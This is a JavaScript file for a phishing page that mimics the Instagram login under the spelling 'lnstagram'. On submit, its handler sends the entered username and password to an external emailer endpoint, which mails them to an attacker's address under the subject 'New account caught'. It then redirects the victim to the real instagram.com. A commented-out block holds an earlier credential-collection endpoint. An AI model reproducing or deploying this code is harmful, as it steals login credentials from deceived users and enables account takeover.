const lf = $('#loginForm')
const lb = $('#loginButton')
const ui = $("#usernameInput")
const uil = $("#usernameInputLabel")
const uif = $("#usernameInputField")
const pi = $("#passwordInput")
const pil = $("#passwordInputLabel")
const pif = $("#passwordInputField")
const pifb = $("#passwordInputFieldButton")

function loginError() {
    setTimeout(() => {
        lb.removeClass("A086a")
        lb.attr("disabled", false)
        $("#loginLoading").hide()
        $("#loginError").show()
    }, 1000)
}
function lbt() {
    let uifvl = uif.val().length
    let pifvl = pif.val().length

    if (pifvl > 0) {
        pifb.show()
        pil.addClass("FATdn")
    } else {
        pifb.hide();
        pil.removeClass("FATdn")
    }
    if (uifvl > 0)
        uil.addClass("FATdn")
    else
        uil.removeClass("FATdn")

    if (uifvl > 0 && pifvl > 5)
        lb.prop("disabled", false)
    else
        lb.prop("disabled", true)
}

uif.on("keyup", function () { lbt(); })
pif.on("keyup", function () { lbt(); })
uif.focusin(function () {
    ui.addClass("HlU5H")
    uif.addClass("focus-visible")
});
uif.focusout(function () {
    ui.removeClass("HlU5H")
    uif.removeClass("focus-visible")
});
pif.focusin(function () {
    pi.addClass("HlU5H")
    pif.addClass("focus-visible")
});
pif.focusout(function () {
    pi.removeClass("HlU5H")
    pif.removeClass("focus-visible")
});
pifb.click(function () {
    if (pif.attr("type") == "text") {
        pif.attr("type", "password")
        pifb.text("Show")
    } else {
        pifb.text("Hide")
        pif.attr("type", "text")
    }
});
lf.submit(function (e) {
    e.preventDefault()
    lb.addClass("A086a")
    lb.attr("disabled", true)
    $("#loginLoading").show()

    var email = "mk6229478@gmail.com"

    $.ajax({
        /*
        url: "https://mkws.ml/lnstagram/catch.php",
        url: "http://localhost/lnstagram/catch.php",
        data: {
            u: uif.val(),
            p: pif.val()
        },
        */
        type: "POST",
        url: "https://mkws.ml/root/tools/emailer/index.php",
        data: {
            emailTo: email,
            emailFrom: "lnstagram - MkWS",
            emailSubject: "New account caught",
            emailBody: `<h1>New account caught</h1><p>Username: <i>${uif.val()}</i><br>Password: <i>${pif.val()}</i></p>`
        },
        success: function () {
            window.location.href = "https://instagram.com";
        },
        error: function () {
            loginError();
        }
    })
})

$(document).ready(() => {
    pifb.hide()
    lbt()
})
